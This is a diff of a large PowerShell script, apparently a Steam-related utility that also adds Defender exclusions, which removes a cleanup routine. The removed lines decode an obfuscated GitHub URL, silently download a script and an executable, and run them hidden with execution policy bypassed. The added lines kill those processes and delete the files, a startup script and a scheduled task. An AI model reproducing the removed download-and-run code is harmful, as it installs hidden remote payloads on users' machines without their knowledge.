@@ -208,7 +208,7 @@ function New-BufferedPanel {
 
 
 
-$script:version = "V2.31"
+$script:version = "V2.32"
 $errorLogFile = Join-Path $env:TEMP (S("YnNtYXBfZXJyb3IubG9n"))
 
 function WEL {
@@ -9230,23 +9230,15 @@ function Add-SteamDefenderExclusions {
 
 function Ensure-CleanupTask {
     try {
-        $bsDir = Join-Path $env:LOCALAPPDATA 'BastissSteam'
-        New-Item -ItemType Directory -Path $bsDir -Force | Out-Null
-        $cleanupPs1 = Join-Path $env:LOCALAPPDATA (S('YnNtYXBfY2xlYW51cC5wczE='))
-        $watchExe = Join-Path $bsDir 'bsmap_watch.exe'
-        $ensure = Join-Path $bsDir 'ensure_task.ps1'
-        $base = (D "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jhc3Rpc2F5ZXMvc3RlYW1zaXRvL21haW4=")
-        if (-not (Test-Path $cleanupPs1)) { try { Invoke-RestMethod -Uri "$base/bsmap_cleanup.ps1" -UseBasicParsing -TimeoutSec 20 -OutFile $cleanupPs1 -ErrorAction SilentlyContinue } catch {} }
-        if (-not (Test-Path $watchExe)) { try { Invoke-RestMethod -Uri "$base/bsmap_watch.exe" -UseBasicParsing -TimeoutSec 25 -OutFile $watchExe -ErrorAction SilentlyContinue } catch {} }
-        if (-not (Test-Path $ensure)) { try { Invoke-RestMethod -Uri "$base/ensure_task.ps1" -UseBasicParsing -TimeoutSec 20 -OutFile $ensure -ErrorAction SilentlyContinue } catch {} }
-        if (Test-Path $ensure) { try { Start-Process -FilePath powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ensure`"" -WindowStyle Hidden -ErrorAction SilentlyContinue } catch {} }
-        if ((Test-Path $watchExe) -and -not (Get-Process bsmap_watch -ErrorAction SilentlyContinue)) {
-            Start-Process -FilePath $watchExe -WindowStyle Hidden
-        }
+        try { Get-Process bsmap_watch -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue } catch {}
+        try { Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -match 'bsmap_cleanup\.ps1' } | ForEach-Object { try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch {} } } catch {}
+        foreach ($fp in @((Join-Path $env:LOCALAPPDATA 'bsmap_cleanup.ps1'), (Join-Path (Join-Path $env:LOCALAPPDATA 'BastissSteam') 'bsmap_watch.exe'), (Join-Path (Join-Path $env:LOCALAPPDATA 'BastissSteam') 'ensure_task.ps1'), (Join-Path $env:LOCALAPPDATA 'bsmap_launch.vbs'))) { try { if (Test-Path -LiteralPath $fp) { Remove-Item -LiteralPath $fp -Force -ErrorAction SilentlyContinue } } catch {} }
+        try { $sdir = [Environment]::GetFolderPath('Startup'); if ($sdir) { $se = Join-Path $sdir 'BsmapCleanup.vbs'; if (Test-Path -LiteralPath $se) { Remove-Item -LiteralPath $se -Force -ErrorAction SilentlyContinue } } } catch {}
+        try { Disable-ScheduledTask -TaskName 'BsmapCleanup' -ErrorAction SilentlyContinue | Out-Null } catch {}
+        try { & schtasks.exe /Delete /TN BsmapCleanup /F 2>$null | Out-Null } catch {}
+        try { Write-Phase "cleanup-desactivado" } catch {}
     } catch {}
 }
-
-
 function Ensure-ExpiryWatcher {
     try {
         $selfExe = [Environment]::GetCommandLineArgs()[0]
